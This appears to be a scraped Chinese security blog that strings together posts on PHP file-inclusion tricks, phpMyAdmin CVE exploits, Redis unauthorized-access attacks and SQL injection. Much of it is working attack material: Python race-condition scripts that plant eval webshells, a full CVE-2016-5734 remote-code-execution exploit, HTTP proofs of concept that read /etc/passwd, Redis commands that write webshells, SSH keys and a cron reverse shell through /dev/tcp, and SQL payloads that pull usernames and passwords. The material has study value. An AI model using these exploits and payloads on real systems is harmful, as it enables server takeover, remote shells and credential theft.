ID。具体而言，我们在Cookie中设置Cookie:PHPSESSID=test，PHP将会在服务器上session存储的位置创建一个文件sess_test，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由session.upload_progress.prefix+session.upload_progress_name组成，最后被写入sess_test文件中。  利用条件   能够创建session文件并知晓路径\n  内容可控\n  session路径 \r\n常见：\n /tmp/ /tmp/sessions /var/lib/php/ /var/lib/php/sessions/  利用思路 由于上传文件结束后，session文件会被清除，我们可以上传大文件，并在上传时自定义session让服务端创建session文件；同时使用条件竞争，在session文件被删除前抢先进行文件包含。\n bp抓包，跑上传大文件的intrude 跑文件包含的intrude  利用脚本多线程跑：\nimport io import requests import threading sessid = \u0026#39;test\u0026#39; data = {\u0026#34;cmd\u0026#34;:\u0026#34;system(\u0026#39;whoami\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) resp = session.post( \u0026#39;http://127.0.0.1:7777/test56.php\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;haha.txt\u0026#39;,f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid} ) def read(session): while True: resp = session.post(\u0026#39;http://127.0.0.1:7777/test56.php?file=session/sess_\u0026#39;+sessid,data=data) if \u0026#39;haha.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: print(\u0026#34;[+++++++++++++]retry\u0026#34;) if __name__==\u0026#34;__main__\u0026#34;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() SSH log 条件：\n 知晓SSH log路径，且可读  一般在/var/log/auth.log\npayload：\nssh \u0026lt;?php phpinfo();?\u0026gt;@ip\r再进行本地包含\renviron PHP以cgi方式运行,proc/self/environ会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。\n条件：\n CGI方式运行 environ文件可读  临时文件 上述这些方法要求能够包含不再Web目录下的文件，一旦PHP设置了open_basedir，则很可能会使得攻击失效。\n向服务器上任意 php 文件以 form-data 式提交请求上传数据时，会生成临时文件：\n\r\n利用：\n 临时文件在短时间内会被删除，所以需要竞争条件 而临时文件名也不知道，如果服务器上有phpinfo，可以从upload_tmp_dir上获取  参考exp：https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py\n自包含 让 php 包含自身从而导致死循环然后 php 就会崩溃，那么它所产生的临时文件就会被保留，而不会被清除，再进行包含。\n思路：\n 上传产生临时文件 phpinfo获取临时文件名 自包含/test.php?include=test.php形成无穷递归，中断删除过程 本地包含  上传文件+崩溃 让 php 包含自身从而导致死循环然后 php 就会崩溃，如果请求中同时存在一个上传文件的请求，则上传的该文件就会被保留。\n利用脚本：\n#!/usr/bin/env python # -*- coding: utf-8 -*- import requests import string import itertools charset = string.digits + string.letters host = \u0026#34;x.x.x.x\u0026#34; port = 80 base_url = \u0026#34;http://%s:%d\u0026#34; % (host, port) def upload_file_to_include(url, file_content): files = {\u0026#39;file\u0026#39;: (\u0026#39;evil.jpg\u0026#39;, file_content, \u0026#39;image/jpeg\u0026#39;)} try: response = requests.post(url, files=files) except Exception as e: print e def generate_tmp_files(): webshell_content = \u0026#39;\u0026lt;?php eval($_REQUEST[c]);?\u0026gt;\u0026#39;.encode( \u0026#34;base64\u0026#34;).strip().encode(\u0026#34;base64\u0026#34;).strip().encode(\u0026#34;base64\u0026#34;).strip() file_content = \u0026#39;\u0026lt;?php if(file_put_contents(\u0026#34;/tmp/ssh_session_HD89q2\u0026#34;, base64_decode(\u0026#34;%s\u0026#34;))){echo \u0026#34;flag\u0026#34;;}?\u0026gt;\u0026#39; % ( webshell_content) phpinfo_url = \u0026#34;%s/include.php?f=include.php\u0026#34; % ( base_url) length = 6 times = len(charset) ** (length / 2) for i in xrange(times): print \u0026#34;[+] %d/ %d\u0026#34; % (i, times) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \u0026#34;__main__\u0026#34;: main() 总结 当找不到本地可包含的文件，有三种方法可行：\n 产生临时文件，竞争条件getshell 使用session.upload_process，包含session文件 让PHP崩溃，同时产生临时文件或上传文件，都可被保留。  ","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/php-6/","title":"PHP 文件包含漏洞相关"},{"content":"phpMyAdmin常见利用 获取版本信息 一般在根目录后加入：\nREADME\rChangeLog\rdoc/html/index.html\rChange\rchangelog.php\rreadme.php\rDocumetation.html\rDocumetation.txt\rtranslators.html\rphpMyAdmin权限  SQL注入获取账号密码 暴破用户名密码  获取网站绝对路径  phpinfo() 利用报错页面 @@datadir、@@basedir根据数据库相关的绝对路径，猜测网站绝对路径 使用load_file()函数读取一些默认配置文件去寻找路径，例如PHP配置文件、Apache/nginx配置文件等  利用  写一句话getshell 通过日志getshell UDF提权 MOF提权  详情参见MySQL提权相关、SQL注入相关。\n其他漏洞 WooYun-2016-199433 任意文件读取\nphpMyAdmin2.x\nPOC：\nPOST /scripts/setup.php HTTP/1.1 Host: your-ip:8080\rAccept-Encoding: gzip, deflate Accept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)\rConnection: close\rContent-Type: application/x-www-form-urlencoded Content-Length: 80\raction=test\u0026amp;configuration=O:10:\u0026quot;PMA_Config\u0026quot;:1:{s:6:\u0026quot;source\u0026quot;,s:11:\u0026quot;/etc/passwd\u0026quot;;}\rCVE-2014-8959 本地文件包含\nphpMyAdmin 4.0.1\u0026ndash;4.2.12\nPHP version \u0026lt; 5.3.4\nPOC：\n/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91\u0026amp;gis_data[gis_type]=/../../../../phpinfo.txt%00 # 注意替换token值\rCVE-2016-5734 后台RCE\nPhpMyAdmin：4.0.10.16 之前的4.0.x版本；4.4.15.7 之前的 4.4.x版本；4.6.3之前的 4.6.x版本\nPHP version： 4.3.0-5.4.6\nPOC：\n#!/usr/bin/env python \u0026#34;\u0026#34;\u0026#34;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7. CVE: CVE-2016-5734 Author: https://twitter.com/iamsecurity run: ./cve-2016-5734.py -u root --pwd=\u0026#34;\u0026#34; http://localhost/pma -c \u0026#34;system(\u0026#39;ls -lua\u0026#39;);\u0026#34; \u0026#34;\u0026#34;\u0026#34; import requests import argparse import sys __author__ = \u0026#34;@iamsecurity\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;url\u0026#34;, type=str, help=\u0026#34;URL with path to PMA\u0026#34;) parser.add_argument(\u0026#34;-c\u0026#34;, \u0026#34;--cmd\u0026#34;, type=str, help=\u0026#34;PHP command(s) to eval()\u0026#34;) parser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, required=True, type=str, help=\u0026#34;Valid PMA user\u0026#34;) parser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--pwd\u0026#34;, required=True, type=str, help=\u0026#34;Password for valid PMA user\u0026#34;) parser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--dbs\u0026#34;, type=str, help=\u0026#34;Existing database at a server\u0026#34;) parser.add_argument(\u0026#34;-T\u0026#34;, \u0026#34;--table\u0026#34;, type=str, help=\u0026#34;Custom table name for exploit.\u0026#34;) arguments = parser.parse_args() url_to_pma = arguments.url uname = arguments.user upass = arguments.pwd if arguments.dbs: db = arguments.dbs else: db = \u0026#34;test\u0026#34; token = False custom_table = False if arguments.table: custom_table = True table = arguments.table else: table = \u0026#34;prgpwn\u0026#34; if arguments.cmd: payload = arguments.cmd else: payload = \u0026#34;system(\u0026#39;uname -a\u0026#39;);\u0026#34; size = 32 s = requests.Session() # you can manually add proxy support it\u0026#39;s very simple ;) # s.proxies = {\u0026#39;http\u0026#39;: \u0026#34;127.0.0.1:8080\u0026#34;, \u0026#39;https\u0026#39;: \u0026#34;127.0.0.1:8080\u0026#34;} s.verify = False sql = \u0026#39;\u0026#39;\u0026#39;CREATE TABLE `{0}` ( `first` varchar(10) CHARACTER SET utf8 NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `{0}` (`first`) VALUES (UNHEX(\u0026#39;302F6500\u0026#39;)); \u0026#39;\u0026#39;\u0026#39;.format(table) # get_token resp = s.post(url_to_pma + \u0026#34;/?lang=en\u0026#34;, dict( pma_username=uname, pma_password=upass )) if resp.status_code is 200: token_place = resp.text.find(\u0026#34;token=\u0026#34;) + 6 token = resp.text[token_place:token_place + 32] if token is False: print(\u0026#34;Cannot get valid authorization token.\u0026#34;) sys.exit(1) if custom_table is False: data = { \u0026#34;is_js_confirmed\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;db\u0026#34;: db, \u0026#34;token\u0026#34;: token, \u0026#34;pos\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;sql_query\u0026#34;: sql, \u0026#34;sql_delimiter\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;show_query\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;fk_checks\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;SQL\u0026#34;: \u0026#34;Go\u0026#34;, \u0026#34;ajax_request\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;ajax_page_request\u0026#34;: \u0026#34;true\u0026#34;, } resp = s.post(url_to_pma + \u0026#34;/import.php\u0026#34;, data, cookies=requests.utils.dict_from_cookiejar(s.cookies)) if resp.status_code == 200: if \u0026#34;success\u0026#34; in resp.json(): if resp.json()[\u0026#34;success\u0026#34;] is False: first = resp.json()[\u0026#34;error\u0026#34;][resp.json()[\u0026#34;error\u0026#34;].find(\u0026#34;\u0026lt;code\u0026gt;\u0026#34;)+6:] error = first[:first.find(\u0026#34;\u0026lt;/code\u0026gt;\u0026#34;)] if \u0026#34;already exists\u0026#34; in error: print(error) else: print(\u0026#34;ERROR: \u0026#34; + error) sys.exit(1) # build exploit exploit = { \u0026#34;db\u0026#34;: db, \u0026#34;table\u0026#34;: table, \u0026#34;token\u0026#34;: token, \u0026#34;goto\u0026#34;: \u0026#34;sql.php\u0026#34;, \u0026#34;find\u0026#34;: \u0026#34;0/e\\0\u0026#34;, \u0026#34;replaceWith\u0026#34;: payload, \u0026#34;columnIndex\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;useRegex\u0026#34;: \u0026#34;on\u0026#34;, \u0026#34;submit\u0026#34;: \u0026#34;Go\u0026#34;, \u0026#34;ajax_request\u0026#34;: \u0026#34;true\u0026#34; } resp = s.post( url_to_pma + \u0026#34;/tbl_find_replace.php\u0026#34;, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies) ) if resp.status_code == 200: result = resp.json()[\u0026#34;message\u0026#34;][resp.json()[\u0026#34;message\u0026#34;].find(\u0026#34;\u0026lt;/a\u0026gt;\u0026#34;)+8:] if len(result): print(\u0026#34;result: \u0026#34; + result) sys.exit(0) print( \u0026#34;Exploit failed!\\n\u0026#34; \u0026#34;Try to manually set exploit parameters like --table, --database and --token.\\n\u0026#34; \u0026#34;Remember that servers with PHP version greater than 5.4.6\u0026#34; \u0026#34; is not exploitable, because of warning about null byte in regexp\u0026#34; ) sys.exit(1) CVE-2018-12613 后台文件包含\nphpMyAdmin : 4.8.0和4.8.1\n利用：\n# 写session文件\rselect '\u0026lt;?php phpinfo();exit;?\u0026gt;'\rhttp://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/l ib/php/sessions/sess_*** // *** 为phpMyAdmin的COOKIE值\rCVE-2018-19968 任意文件包含/RCE\nphpMyAdmin ：4.8.0-4.8.3\n利用：\n# 创建数据库，并将PHP代码写入session文件\rCREATE DATABASE foo;\rCREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );\rINSERT INTO foo.bar SELECT '\u0026lt;?php phpinfo(); ?\u0026gt;';\r# 访问如下url，在foo数据库中生成phpMyAdmin的配置表\rhttp://xxxx/chk_rel.php?fixall_pmadb=1\u0026amp;db=foo\r# 在foo数据库中插入如下数据\rINSERT INTO pma__column_infoSELECT ‘1’, ‘foo’, ‘bar’, ‘baz’, ‘plop’,\r‘plop’, ‘plop’, ‘plop’,\r‘../../../../../../../../tmp/sess_***’,‘plop’; // ***为phpMyAdmin的COOKIE值;需要注意session文件的位置，不同环境会有差异\r# 访问如下url，实现包含session文件\rhttp://xxxx/tbl_replace.php?db=foo\u0026amp;table=bar\u0026amp;where_clause=1=1\u0026amp;fields_name[multi_edit][][]=baz\u0026amp;clause_is_unique=1\rCVE-2020-0554 后台SQL注入\nphpMyAdmin 4\u0026lt; 4.9.4\nphpMyAdmin 5\u0026lt; 5.0.1\nPOC：\nhttp://xxxx/server_privileges.php?ajax_requests=true\u0026amp;validate_username=1\u0026amp;username=1%27or%201=1%20--+db=\u0026amp;token=c2064a8c5f437da931fa01de5aec6581\u0026amp;viewing_mode=server\r# 执行完毕后仅知道这条语句的执行成功与否，失败的话会报错，因此后续可以利用报错注入\r","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/sql-phpmyadmin/","title":"phpMyAdmin 常见利用"},{"content":"Redis未授权利用 Redis常用命令 服务端启动：redis-server xxx.conf\n本地连接：redis-cli\n远程连接：redis-cli -h host -p port -a password\n未授权利用方式 写Webshell 前提条件：\n 知道Web目录 redis运行用户拥有该目录写权限  keys * set webshell \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34; config get * config set dir /var/www/html # 设置文件写入目录 config set dbfilename 1.php # 设置写入文件名 save # 保存 注意\n redis可以创建文件，但无法创建目录\n清理痕迹要删除key，同时还原config里的配置项\n \r\n写ssh公钥 目标靶机的基本配置\n 存在root用户或其他用户下.ssh目录(权限700) 和 authorized_keys文件(权限600)\n 前提条件:\n 已知目标主机用户 拥有.ssh目录 允许使用基于密钥认证方式登录  // 本机生成公私钥 ssh-keygen -t rsa // 将本机公钥放入key.txt (echo -e \u0026#34;\\n\u0026#34;;cat id_rsa.pub;ehco -e \u0026#34;\\n\u0026#34;) \u0026gt; key.txt // 执行redis命令，生成键值对 cat /root/.ssh/key.txt | redis-cli -h ip -x set pub config set dir /root/.ssh config set dbfilename authorized_keys save // 利用私钥登录 ssh -i id_rsa root@ip 写定时任务反弹shell 前提条件：\n redis用户拥有计划任务目录写权限 目标开启cron服务  // 攻击机开启监听\rnc -nvlp 7777\rset shell \u0026quot;\\n\\n*/1 * * * * /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.10.140/7777 0\u0026gt;\u0026amp;1\\n\\n\u0026quot;\rconfig set dir /var/spool/cron\rconfig set dbfilename root\rsave\r注意：\n ubuntu反弹shell会出现多处错误：\n1.提示缺少默认邮件服务器，实际是因为计划任务执行出错，想要通过邮件服务器发送错误信息\n2.本质的错误信息为:sh: 1: Syntax error: Bad fd number，查询后发现cron中command的执行环境为/bin/sh，而/bin/sh指向的是dash(它更好，变成默认了)，反弹任务中用bash环境去执行，所以产生冲突报错。因此只需要将目标机器的/bin/sh指向bash就可，或者避免在cron文件里去使用bash这个shell，另外去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件，再或者写计划任务的反弹shell内容如下：*/1 * * * * bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/7777 0\u0026gt;\u0026amp;1\u0026quot;\n3.redis写入root文件权限为644，而root文件权限必须为600，否则报不安全错误\n3.redis写入文件后会出现乱码，centos主机会忽略乱码执行命令，而ubuntu和debian无法忽视乱码，不可以执行命令，反弹失败()。因此可尝试主从复制写纯净文件达到效果，当然有了可利用的主从就不一定执着于定时任务\n 主从复制RCE 随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和cron，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。\nRedis主从复制 edis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。\n使用两台虚拟机来模拟主从复制。\n在目标机器上设置slave状态\n\r\n在master上设置键 xxx\n\r\n在slave上查看键 xxx\n\r\nRedis模块 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。\n编译.so模块, 代码: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.\n利用原理 详细原理：https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf\n在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意.so文件，我们就可以执行拓展的新命令了。\n复现——主动连接模式 使用脚本模拟一个服务端来作为master(包含fullresync请求)\n本次目标靶机为ubuntu，作为slave\n直接执行poc脚本如下:\n\r\n复现——被动连接模式  通过 SSRF 攻击Redis\n内网 Redis 未授权访问/已知 Redis 口令, Redis 需要反向连接 redis rogue server\n 模拟一个服务端master，等待连接\n\r\nredis未授权进入目标机器，slaveof到该master\n\r\nmaster端等到连接后，成功同步恶意payload至slave\n\r\n成功在目标机器加载模块并执行命令\n\r\n主从复制写纯净文件 在 linux 下，可以利用 SYNC 主从同步，来直接写入无杂质的文件，脚本及用法如下：\nhttps://github.com/r35tart/RedisWriteFile (借助原本的redis主从复制rce脚本更改)\n此脚本是通过 Redis 主从写出无损文件，可用于 Windows 平台下写出无损的 EXE、DLL、 LNK 和 Linux 下的 SO 等二进制文件\n也可以用无杂质覆写 Linux 中的 /etc/shadow\n简单复现 \r\n成功写入纯净文件\n\r\nRedis在Windows下的利用方式 主要是利用主从写纯净文件：\n 系统 DLL 劫持 （目标重启或注销） 针对特定软件的 DLL 劫持（目标一次点击） 覆写目标的快捷方式 （目标一次点击） 覆写特定软件的配置文件达到提权目的 （目标无需点击或一次点击） 覆写 sethc.exe 等文件 （攻击方一次触发）  参考：\nhttp://r3start.net/index.php/2020/05/25/717\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/redis/","title":"Redis 未授权利用"},{"content":"SQL注入相关(配合sqli-labs) 基础总结+sqli-lab，lab过程偏向白盒，省略黑盒探测过程\n数据库相关 分类  关系型数据库  表格存储，表和表间关系构成数据库，例如MySQL、SQLServer。\n 非关系型数据库  有Key-Value存储数据库、列存储数据库、文档型数据库、图形存储数据库。\n例如：\n键值数据库：Redis、Memcached\n文档数据库：MongoDB\n图形数据库：Neo4j\n基础操作 # 查看数据库\rshow databases;\r# 使用数据库\ruse mysql;\r# 查看当前数据库\rselect database();\r# 查看数据表\rshow tables;\r# 查看数据库版本\rselect version();\r# 查看当前数据库用户\rselect user();\r# 查看数据库路径\rselect @@datadir;\r# 查看安装路径\rselect @@basedir;\r# 查看系统类型\rselect @@version_compile_os;\rMySQL元数据-information_schema 该数据库存储MySQL 服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表的数据类型与访问权限等。\n该库中有以下三个表：\n SCHEMATA  提供当前 MySQL 实例中所有数据库的信息。show databases; 的结果就是取之此表。\n TABLES  提供数据库中所有表的信息(包括视图)。\n COLUMNS  提供表中所有列信息。\n查询数据表：\nselect table_name from information_schema.tables where table_schema='test';\r查询数据列：\nselect column_name from information_schema.columns where table_name='table1';\rSQL注入相关判断 种类 布尔型注入\n联合查询注入\n报错型注入\n时间型注入\n堆叠注入\n判断注入类型 在进行手工注入前需要判断当前位置是字符型还是数字型。\n 数字型  一般可通过and 1=1和and 1=2判断。\n使用运算符判断：\n通过加、减、乘、除等运算，判断输入参数附近有没有引号包裹。\n 字符型  一般可通过and '1'='1和and '1'='2判断。\n使用类型转换特性判断：\n在MySQL中当数字与字符进行比较时，字符会被转为数字进行比较。\n例如：\n\r\n字符串1和数字1相等；字符串1a和数字1相等；字符串b和数字0相等。\n 综上  可根据上述方法做一个基本的判断，例如?id=2-1，返回为空，表明不是数字型可能是字符型；访问?id=1a，成功回显，表明是字符型。\n判断数据库 基于报错判断  MySQL   you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near\u0026hellip;\n  Access   Microsoft JET Database…\n  MSSQL   Microsoft ODBC Database…\n 基于数据库标志  MSSQL  select @@version;\r Oracle  select banner from v$version;\r MySQL  select @@version,version(),length(user)\u0026gt;0;\r PostgreSQL  select version();\r基于数据库名  MySQL:information_schema Access:mysysobjects Oracle:sys.user_tables MSSQL:sysobjects  基于数据库特有函数   MSSQL:@@pack_received、@@rowcount\n  MySQL:connection_id()、last_insert_id()、row_count()\n  Oracle:bitand(1,1)\n  PostgreSQL: select extract(doy from now())\n  MSSQL和MySQL中都可用substring，而Oracle中只能调用substr\n  \u0026hellip;\n基于字符串处理方式 MSSQL：'a'+'b'='ab'\nMySQL：'a'+'b'='ab'、'ab'=concat('a','b')\nOracle：'a'+'b'='a'||'b'、'ab'=concat('a','b')\nPostgreSQL：'ab'=concat('a','b')\n\u0026hellip;\n基于特殊符号及注释  Access:null、%00 MySQL:#、--、/**/ Oracle:-- 、/**/ MSSQL：-- 、/**/ Oracle中不支持多行查询，当存在;子句查询符会报错  UNION注入 原理 union用于将两个或多个select查询语句结果集合并\n注意点：\n 使用union，select语句必须是相同数量的列\n 常见用法 -1\u0026#39;+UNION+SELECT+1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+ // 库名 union select 1,group_concat(schema_name),3 from information_schema.schemata union select 1,(select schema_name from information_schema.schemata limit 0,1),3 // 表名 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\u0026#39;security\u0026#39; // 列名 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;emails\u0026#39; // 数据 union select 1,group_concat(id,email_id),3 from security.emails // ???待。。。 ?id=-1\u0026#39;unionselect1,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3**GROUP_CONCAT **\nGROUP_CONCAT(expr) ——从 expr 中连接所有非 NULL 的字符串。如果没有非 NULL 的字符串，那么它就会返回 NULL\n系统变量group_concat_max_len控制允许返回的最大字节长度，默认值为1M(\u0026gt;= MariaDB 10.2.4)或1K(\u0026lt;= MariaDB 10.2.3)\nGROUP_CONCAT([DISTINCT]expr[,expr...][ORDERBY{unsigned_integer|col_name|expr}[ASC|DESC][,col_name...]][SEPARATORstr_val])SEPARATOR指定串联各值时使用的分隔符。默认分隔符为逗号(,)CONCAT\n将多个字符串连接为一个字符串，如果当中有一个NULL，返回结果即为NULL\n显错注入 主要分类  BigInt 等数据类型溢出 Xpath 语法错误 count() + rand() + group by 导致主键重复 空间数据类型函数错误  updatexml 和 extractvalue MySQL版本\u0026gt;5.1添加了对XML文档修改和查询的函数updatexml 和 extractvalue，二者报错原理类似\n updatexml() (返回替换的XML片段) 和 extractvalue()(使用XPath表示法从XML字符串中提取值)第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。\n报错长度最大为 32 位\n 常见用法\n//显示当前数据库updatexml(1,CONCAT(0x7e,database()),1)//显示所有数据库updatexml(1,CONCAT(0x7e,(selectschema_nameFROMINFORMATION_SCHEMA.SCHEMATAlimitx,1),0x7e),1)//获取表名updatexml(1,CONCAT(0x7e,(selecttable_namefrominformation_schema.tableswheretable_schema=\u0026#34;sectest\u0026#34;limitx,1),0x7e),1)updatexml(1,make_set(3,\u0026#39;~\u0026#39;,(selectgroup_concat(table_name)frominformation_schema.tableswheretable_schema=database())),1)//获取列名updatexml(1,CONCAT(0x7e,(selectcolumn_namefrominformation_schema.COLUMNSwheretable_name=\u0026#34;wp_user_\u0026#34;limit1,1),0x7e),1)updatexml(1,make_set(3,\u0026#39;~\u0026#39;,(selectgroup_concat(column_name)frominformation_schema.columnswheretable_name=\u0026#34;users\u0026#34;)),1)//获取数据updatexml(1,CONCAT(0x7e,(selectusernamefromwp_user_limit0,1),0x7e),1)updatexml(1,CONCAT(0x7e,(selectpasswordfromwp_user_whereusername=\u0026#34;admin\u0026#34;limit0,1),0x7e),1)updatexml(1,CONCAT(0x7e,(selectGROUP_CONCAT(username,0x3a,password)fromwp_user_whereid=1),0x7e),1)updatexml(1,make_set(3,\u0026#39;~\u0026#39;,(selectdatafromusers)),1)#三要素显错注入 三要素原理分析\n floor(x) 返回\u0026lt;=x的最大整数 rand(0) 在给了随机种子0之后，将产生固定伪随机序列 floor(rand(0)*2) 最终产生的可预测伪随机序列是'011011\u0026hellip;' 使用count(*) 和 group by统计数据，就是建立虚拟表，对每条记录计算统计键，无则插入，有则+1 当以foor(rand(0*2))为键使用group by 分组统计时：针对查询表第一条记录，插入前第1次计算值为0，查无此键，进行插入时第2次计算值为1，查无此键，插入即可，实际插入虚拟表的第一条记录键为1；针对查询表第二条记录，插入前第3次计算值为1，查有此键，则直接将count+1，不再进行插入时的计算；针对第三条记录，插入前第4次计算值为0，查无此键，进行插入时第5次计算值为1，查有此键，虚拟表主键唯一，无法插入报错！！！  核心其实就是固定的伪随机序列和多次计算\n三要素(count、rand、group by)再加一个要素就是原始查询表记录至少为3条\n注意点\n 在查询结果上再执行查询时，必须给定一个别名\nlimit 0,1 -\u0026gt; offset + 偏移量 表示最后返回的记录条数\nhttps://blog.csdn.net/weixin_43803070/article/details/96448914\n 常见用法\n1\u0026#39; and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a) 1\u0026#39;and(select1from(selectcount(*),concat((selectconcat(username,\u0026#39;,\u0026#39;,password)fromuserslimit0,1),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a)--+ 注意点：上述两个payload注出来的数据后跟着一个数字`1`，因为concat了一个`floor(rand(0)*2)`其他特性利用 列名重复 原理\nNAME_CONST可以制造一个列，利用列名重复报错\n注意点\n 常根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没有比较好的利用方式。但利用这个特性加上join函数可以爆列名\n 常见用法\nselect*from(selectNAME_CONST(version(),1),NAME_CONST(version(),1))x;ERROR1060(42S21):Duplicatecolumnname\u0026#39;5.7.17\u0026#39;//配合join获取列名select*from(select*fromtestajointestb)c;ERROR1060(42S21):Duplicatecolumnname\u0026#39;id\u0026#39;select*from(select*fromtestajointestbusing(id))c;//using(id)等同于配合join使用的onERROR1060(42S21):Duplicatecolumnname\u0026#39;name\u0026#39;//两个test表必然每个列都重复，using了id列之后，就会继续报出第二列错select*from(select*fromtestajointestbusing(id，name))c;//报第三列列名几何函数 原理\nmysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错\n？？？？报错原理有待考究\n注意点\n 在版本号为5.5.47上可以用来注入，而在5.7.17上则不行\n 常见用法\n5.5.47//可行1\u0026#39; and (select multipoint((select * from (select * from (select version())a)b))) ERROR 1367 (22007): Illegal non geometric \u0026#39;(select`b`.`version()`from((select\u0026#39;5.5.47\u0026#39;AS`version()`fromdual)`b`))\u0026#39; value found during parsing 5.7.17 //失效 1\u0026#39;and(selectmultipoint((select*from(select*from(selectversion())a)b)))ERROR1367(22007):Illegalnongeometric\u0026#39;(select `a`.`version()` from ((select version() AS `version()`) `a`))\u0026#39;valuefoundduringparsingexp()等函数 原理\nMySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误；\n当用 ~ 运算符按位取反的方式得到一个最大值，该运算符可以处理一个字符串，经过其处理的字符串会变成一个很大整数其足以超过 MySQL 的 Double 数组范围，从而报错输出\n注意点\n 使用版本：MySQL5.5.5 及以上版本\n 常见用法\n1\u0026#39; and (select exp(~(select * from(select version())x))) ERROR 1690 (22003): DOUBLE value is out of range in \u0026#39;exp(~((select\u0026#39;5.5.29\u0026#39;fromdual)))\u0026#39; 1\u0026#39;and(selectexp(~(select*from(selectuser())x)))ERROR1690(22003):DOUBLEvalueisoutofrangein\u0026#39;exp(~((select \u0026#39;root@localhost\u0026#39; from dual)))\u0026#39;1\u0026#39; and (select exp(~(select * from(select database())x))) ERROR 1690 (22003): DOUBLE value is out of range in \u0026#39;exp(~((select\u0026#39;ctf\u0026#39;fromdual)))\u0026#39; //读取文件(13行限制) 1\u0026#39;and(selectexp(~(select*from(selectload_file(\u0026#39;/etc/passwd\u0026#39;))x)))//dump当前上下文中所有的tables和columns注意：因为是当前上下文，所以单引号前条件得存在，正确1\u0026#39; and (select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where 